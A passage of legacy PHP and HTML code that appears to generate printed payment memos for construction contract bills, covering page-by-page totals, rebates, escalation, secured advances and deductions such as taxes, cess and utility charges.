			</td>
			<td  align='left' width='' class=''>&nbsp;</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
		</tr>
		<?php 
			UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page); 
			$rowcount++; $Line++;
			
		?>
			<!--<tr style="background-color:#A0EAFA"><td colspan="12"><?php echo $subdivname."*".$CheckDevRes."<br/>"; ?></td></tr>-->
		<?php
			/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<tr bgcolor=""><td colspan="12">&nbsp;</td></tr>
		<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<!--<tr bgcolor="#d4d8d8" style="height:10px"><td colspan="13" style="border-top-color:#0A9CC5; border-bottom-color:#0A9CC5;"></td></tr>-->
		<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
		<?php //echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>"; ?>
		<?php
		$color_var++; $table_group_row++;
		$AbstractStr			.= $divid."*".$subdivid."*".$fromdate."*".$todate."*".$runn_acc_bill_no."*".$abstsheetid."*".$abstmbno."*".$page."*";
		$OverAllSlmAmount 		=  $OverAllSlmAmount	+	$slm_amount_item; 
		$OverAllDpmAmount 		=  $OverAllDpmAmount	+	$dpm_amount_item; 
		$OverAllSlmDpmAmount 	=  $OverAllSlmDpmAmount	+	$total_amt_item;
		//print_r($DevItemArray); echo "<br/>";
	}
	//echo $Line;	
		$SlmRebateAmount 		=  $OverAllSlmAmount 	* 	$overall_rebate_perc /100;
		$DpmRebateAmount 		=  $OverAllDpmAmount 	* 	$overall_rebate_perc /100;
		$SlmDpmRebateAmount 	=  $OverAllSlmDpmAmount * 	$overall_rebate_perc /100;
		
		$SlmNetAmount 			=  round($OverAllSlmAmount	-	$SlmRebateAmount); 
		$DpmNetAmount 			=  round($OverAllDpmAmount	-	$DpmRebateAmount); 
		$SlmDpmNetAmount 		=  round($OverAllSlmDpmAmount	-	$SlmDpmRebateAmount);
		
		$final_amount_str .= $SlmNetAmount."*".$DpmNetAmount."*".$SlmDpmNetAmount."*".$Crbn."@@";
		
	$Linecheck = 3;
	$LineTemp = $Line + $Linecheck;
	if($LineTemp >= 30){ $Line = 30; } 
	if($Line >= 30)
	{
	?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $Line; ?></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $LineTemp; ?></td>
	</tr>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
	</table>
	<p style='page-break-after:always;'></p>
	<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
		<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
	</table>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
	<?php echo $tablehead; ?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td></td>
	</tr>
	<?php
	$Line = $LineIncr; $page++;
	}
	?>
	
		<tr class="labelprint" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<tr class="labelprint">
			<td colspan="2" align="right">Less: Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format(round($SlmDpmNetAmount), 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format(round($SlmNetAmount), 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
	<?php 
	
	
	//$Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} 
	/*if($Line >= 30)
	{
	?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td></td>
	</tr>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
	</table>
	<p style='page-break-after:always;'></p>
	<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
		<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
	</table>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
	<?php echo $tablehead; ?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td></td>
	</tr>
	<?php
	$Line = $LineIncr; $page++;
	}
	else
	{
	?>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
	Page <?php echo $page; ?></td></tr>
	<?php	
	}*/
	?>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
	Page <?php echo $page; ?></td></tr>
	</table>
	<?php 
	echo "<p style='page-break-after:always;'></p>";
	$Line = $LineIncr; 
	$page++;
}
//echo ;
$end_page = $page;

/*if($final_amount_str != "")
{
	$final_amount_str = rtrim($final_amount_str,"@@");
	$exp_final_amount_str = explode("@@",$final_amount_str);
	for($s1=0; $s1<count($exp_final_amount_str); $s1++)
	{
		$curr_str 			= $exp_final_amount_str[$s1];
		if($curr_str != "")
		{
			$exp_curr_str 		= explode("*",$curr_str);
			$esc_slm_amt 		= $exp_curr_str[0];
			$esc_dpm_amt 		= $exp_curr_str[1];
			$esc_upto_date_amt 	= $exp_curr_str[2];
			$esc_rbn 			= $exp_curr_str[3];
			//echo $esc_rbn."<br/>";
			$update_abstarct_query = "update abstractbook set upto_date_total_amount_esc = '$esc_upto_date_amt', dpm_total_amount_esc = '$esc_dpm_amt', 
									slm_total_amount_esc = '$esc_slm_amt' where sheetid = '$abstsheetid' and rbn = '$esc_rbn'";
			$update_abstarct_sql = mysql_query($update_abstarct_query);
		}
	}
	
		$delete_mbook_query		= 	"delete from mymbook where sheetid = '$sheetid' and rbn = '$esc_rbn' and esc_id = '$esc_id' and 
									quarter = '$quarter' and mtype = 'EA' and genlevel = 'esc_abstract'";
		$delete_mbook_sql 		= 	mysql_query($delete_mbook_query);						
		
		$insert_mbook_query  	= 	"insert into mymbook set mbno = '$abstmbno', startpage = '$start_page', endpage = '$end_page', sheetid = '$sheetid', 
									quarter = '$quarter', staffid = '$staffid', rbn = '$esc_abs_rbn', esc_id = '$esc_id', active =1, mtype = 'EA', genlevel = 'esc_abstract', mbookorder = 1";
		$insert_mbook_sql = mysql_query($insert_mbook_query);
	
}*/
/*$EscQtrArray = array();
$EscTccAmtArray = array();
$EscTcaAmtArray = array();
$esc_cnt = 0;
$Esc_Total_Amt = 0;
$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn' ORDER BY quarter ASC";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		while($EscList = mysql_fetch_object($select_esc_rbn_sql))
		{
			$quarter = $EscList->quarter;
			$esc_tcc_amount = $EscList->tcc_amt;
			$esc_tca_amount = $EscList->tca_amt;
			$esc_qtr_amt = $EscList->esc_total_amt;
			
			$Esc_Total_Amt = $Esc_Total_Amt+$esc_tcc_amount+$esc_tca_amount;
			
			array_push($EscQtrArray,$quarter);
			array_push($EscTccAmtArray,$esc_tcc_amount);
			array_push($EscTcaAmtArray,$esc_tca_amount);
		}
	}
}
$Esc_Total_Amt = round($Esc_Total_Amt);
//print_r($EscQtrArray);print_r($EscAmtArray);
$secured_advance_query = "select sec_adv_amount from secured_advance where sheetid = '$abstsheetid' and rbn = '$rbn'";
$secured_advance_sql = mysql_query($secured_advance_query);
if($secured_advance_sql == true)
{
	$SAList 		= 	mysql_fetch_object($secured_advance_sql);
	$sec_adv_amount	= 	$SAList->sec_adv_amount; 
}
else
{
	$sec_adv_amount = 0;
}

$total_recovery = 0;
$water_recovery_query = "select water_cost from generate_waterbill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$water_recovery_sql = mysql_query($water_recovery_query);
if($water_recovery_sql == true)
{
	while($WRList 	= 	mysql_fetch_object($water_recovery_sql))
	{
		$water_charge 	=  $water_charge+$WRList->water_cost; 
	}
}
else
{
	$water_charge = 0;
}
$total_recovery = $total_recovery + $water_charge;
$electricity_recovery_query = "select electricity_cost from generate_electricitybill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$electricity_recovery_sql = mysql_query($electricity_recovery_query);
if($electricity_recovery_sql == true)
{
	while($ERList 	= 	mysql_fetch_object($electricity_recovery_sql))
	{
		$electricity_charge  = 	$electricity_charge+$ERList->electricity_cost;
	}
}
else
{
	$electricity_charge = 0;
}
$total_recovery = $total_recovery + $electricity_charge;
$general_recovery_query = "select * from generate_otherrecovery where sheetid = '$abstsheetid' and rbn = '$rbn'";
//echo $general_recovery_query;
$general_recovery_sql = mysql_query($general_recovery_query);
if($general_recovery_sql == true)
{
	$GRList 			= 	mysql_fetch_object($general_recovery_sql);
	$sd_amt 			= 	round($GRList->sd_amt);
	$sd_percent 		= 	$GRList->sd_percent;
	$wct_amt 			= 	round($GRList->wct_amt);
	$wct_percent 		= 	$GRList->wct_percent;
	$vat_amt 			= 	round($GRList->vat_amt);
	$vat_percent 		= 	$GRList->vat_percent;
	$mob_adv_amt 		= 	round($GRList->mob_adv_amt);
	$mob_adv_percent 	= 	$GRList->mob_adv_percent;
	$lw_cess_amt 		= 	round($GRList->lw_cess_amt);
	$lw_cess_percent 	= 	$GRList->lw_cess_percent;
	$incometax_amt 		= 	round($GRList->incometax_amt);
	$incometax_percent 	= 	$GRList->incometax_percent;
	$it_cess_amt 		= 	round($GRList->it_cess_amt);
	$it_cess_percent 	= 	$GRList->it_cess_percent;
	$it_edu_amt 		= 	round($GRList->it_edu_amt);
	$it_edu_percent 	= 	$GRList->it_edu_percent;
	$land_rent 			= 	round($GRList->land_rent);
	$liquid_damage 		= 	round($GRList->liquid_damage);
	$other_recovery_1 	= 	round($GRList->other_recovery_1_amt);
	$other_recovery_2	= 	round($GRList->other_recovery_2_amt);
	$other_recovery_1_desc 	= 	$GRList->other_recovery_1_desc;
	$other_recovery_2_desc	= 	$GRList->other_recovery_2_desc;
	if($other_recovery_1_desc == "")
	{
		$other_recovery_1_desc = "Other Recovery 1 ";
	}
	if($other_recovery_2_desc == "")
	{
		$other_recovery_2_desc = "Other Recovery 2 ";
	}
	$non_dep_machine_equip 	= 	round($GRList->non_dep_machine_equip);
	$non_dep_man_power 	= 	round($GRList->non_dep_man_power);
	$nonsubmission_qa 	= 	round($GRList->nonsubmission_qa);
}
if($non_dep_machine_equip != 0)
{
	$non_dep_machine_equip_print = number_format($non_dep_machine_equip, 2, '.', '');
}
else
{
	$non_dep_machine_equip_print = "NIL";
}

if($non_dep_man_power != 0)
{
	$non_dep_man_power_print = number_format($non_dep_man_power, 2, '.', '');
}
else
{
	$non_dep_man_power_print = "NIL";
}

if($electricity_charge != 0)
{
	$electricity_charge_print = number_format($electricity_charge, 2, '.', '');
}
else
{
	$electricity_charge_print = "NIL";
}

if($water_charge != 0)
{
	$water_charge_print = number_format($water_charge, 2, '.', '');
}
else
{
	$water_charge_print = "NIL";
}
$total_recovery = $total_recovery + $sd_amt+$wct_amt + $vat_amt+$mob_adv_amt + $lw_cess_amt+$incometax_amt + $it_cess_amt+$it_edu_amt + $land_rent+$liquid_damage + $other_recovery_1 + $other_recovery_2 + $non_dep_machine_equip + $non_dep_man_power + $nonsubmission_qa;
$rrcount = 0;  $total_rec_rel_amt = 0;
$RRDescCivArr = array(); $RRAmtCivArr = array(); $RRDescAccArr = array(); $RRAmtAccArr = array();

$recov_release_query = "select * from recovery_release where sheetid = '$abstsheetid' and rbn = '$rbn'";
$recov_release_sql = mysql_query($recov_release_query);
//echo $recov_release_query;
if($recov_release_sql == true)
{
	if(mysql_num_rows($recov_release_sql)>0)
	{
		while($RecRelList = mysql_fetch_object($recov_release_sql))
		{
			$rec_rel_desc_civil = $RecRelList->description_civil;
			$rec_rel_amt_civil 	= $RecRelList->amount_civil;
			$rec_rel_desc_acc 	= $RecRelList->description_acc;
			$rec_rel_amt_acc 	= $RecRelList->amount_acc;
			array_push($RRDescCivArr,$rec_rel_desc_civil);
			array_push($RRAmtCivArr,$rec_rel_amt_civil);
			array_push($RRDescAccArr,$rec_rel_desc_acc);
			array_push($RRAmtAccArr,$rec_rel_amt_acc);
			$total_rec_rel_amt  = $total_rec_rel_amt+$rec_rel_amt_civil;
			$rrcount++;
		}
	}
}

$page++;
$OverAllSlmDpmAmount = round($OverAllSlmDpmAmount);
$OverAllSlmAmount = round($OverAllSlmAmount);
//echo "<p style='page-break-after:always;'></p>";
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
//echo "<tr><td class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelbold' align='center' colspan='12'><u>Memo of payment</u></td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Upto date value of work done : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmDpmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Deduct Previous Paid : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>(-)&nbsp;&nbsp;".number_format($OverAllDpmAmount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
if(count($EscQtrArray)>0)
{
	for($q1=0; $q1<count($EscQtrArray); $q1++)
	{
		$EQtr = $EscQtrArray[$q1];
		$ETccAmt = $EscTccAmtArray[$q1];
		$ETcaAmt = $EscTcaAmtArray[$q1];
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CC Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
$OverAllSlmAmount = round($OverAllSlmAmount+$Esc_Total_Amt);

//echo '<hr style="border-top: dotted 1px;" />';
//$OverAllSlmAmount = $OverAllSlmAmount + $sec_adv_amount;
$Overall_net_amt_final = round(($OverAllSlmAmount + $sec_adv_amount + $total_rec_rel_amt - $total_recovery),2);
$Overall_net_amt_final = round($Overall_net_amt_final);

echo "<tr style='border:none'><td style='border:none' class='labelbold' align='right' colspan='6'>Net Amount : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'>  </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td style='border:none; border-top:1px dashed #000000' class='labelbold' align='right' colspan='2'>".number_format($OverAllSlmAmount, 2, '.', '')."</td><td style='border:none; border-top:1px dashed #000000'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Secured Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($sec_adv_amount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td colspan='2' class='labelbold' align='right' style='border:none'>&nbsp;<u>Recoveries</u>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td style='border:none' class='labelbold' align='left' colspan='10'></td></tr>";
$ea = 1; $eb = 1; $ed = 1; 
$ea_text = "<b>Under 8[a]</b>"; $eb_text = "<b>Under 8[b]</b>";  $ec_text = "<b>Under 8[c]</b>";  $ed_text = "<b><u>With hold Amount</u></b>";
if($wct_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>W.C.T @ ".number_format($wct_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($wct_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($vat_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>VAT @  ".number_format($vat_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($vat_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";


}
if($lw_cess_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Labour Welfare CESS @ ".number_format($lw_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($lw_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";




}
if($mob_adv_percent != 0)
{
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($incometax_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Income Tax @ ".number_format($incometax_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($incometax_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_cess_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Cess @ ".number_format($it_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_edu_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Education CESS @ ".number_format($it_edu_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_edu_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
//if($water_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Water Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$water_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
//if($electricity_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Electricity Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".$electricity_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
if($land_rent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Rent for Land : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($land_rent, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($liquid_damage != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Liquidated Damages : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($liquid_damage, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_1 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_1_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_1, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_2 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_2_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_2, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of machineries & equipment as (per clause 18)  : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_machine_equip_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";

